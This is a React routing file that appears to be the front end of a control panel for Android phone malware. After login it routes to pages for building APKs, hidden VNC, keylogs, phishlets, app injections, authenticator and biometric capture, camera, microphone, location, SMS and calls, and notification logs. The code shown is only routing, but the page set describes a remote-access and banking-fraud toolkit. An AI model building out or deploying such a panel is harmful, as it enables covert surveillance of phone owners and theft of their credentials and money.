import React, { useEffect } from 'react';
import { Routes, Route, Navigate } from 'react-router-dom';
import { useAuthStore } from './hooks/useAuth.js';
import Layout from './components/Layout.jsx';
import Login from './pages/Login.jsx';
import Home from './pages/Home.jsx';
import BuildAPK from './pages/BuildAPK.jsx';
import DeviceInfo from './pages/DeviceInfo.jsx';
import Authenticator from './pages/Authenticator.jsx';
import HiddenVNC from './pages/HiddenVNC.jsx';
import Location from './pages/Location.jsx';
import Camera from './pages/Camera.jsx';
import Microphone from './pages/Microphone.jsx';
import Phishlets from './pages/Phishlets.jsx';
import Injections from './pages/Injections.jsx';
import Biometrics from './pages/Biometrics.jsx';
import Logs from './pages/Logs.jsx';
import Keylogs from './pages/Keylogs.jsx';
import PushNotification from './pages/PushNotification.jsx';
import LaunchIntent from './pages/LaunchIntent.jsx';
import NotificationsLog from './pages/NotificationsLog.jsx';
import SMSCall from './pages/SMSCall.jsx';
import Firewall from './pages/Firewall.jsx';
import UserManagement from './pages/UserManagement.jsx';
import Toolkit from './pages/Toolkit.jsx';
import Settings from './pages/Settings.jsx';

export default function App() {
  const { token, initAuth } = useAuthStore();
  useEffect(() => { initAuth(); }, []);
  if (!token) return <Login />;
  return (
    <Layout>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/build-apk" element={<BuildAPK />} />
        <Route path="/device-info" element={<DeviceInfo />} />
        <Route path="/authenticator" element={<Authenticator />} />
        <Route path="/hidden-vnc" element={<HiddenVNC />} />
        <Route path="/location" element={<Location />} />
        <Route path="/camera" element={<Camera />} />
        <Route path="/microphone" element={<Microphone />} />
        <Route path="/phishlets" element={<Phishlets />} />
        <Route path="/injections" element={<Injections />} />
        <Route path="/biometrics" element={<Biometrics />} />
        <Route path="/logs" element={<Logs />} />
        <Route path="/keylogs" element={<Keylogs />} />
        <Route path="/push-notification" element={<PushNotification />} />
        <Route path="/launch-intent" element={<LaunchIntent />} />
        <Route path="/notifications-log" element={<NotificationsLog />} />
        <Route path="/sms-call" element={<SMSCall />} />
        <Route path="/firewall" element={<Firewall />} />
        <Route path="/user-management" element={<UserManagement />} />
        <Route path="/toolkit" element={<Toolkit />} />
        <Route path="/settings" element={<Settings />} />
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Layout>
  );
}
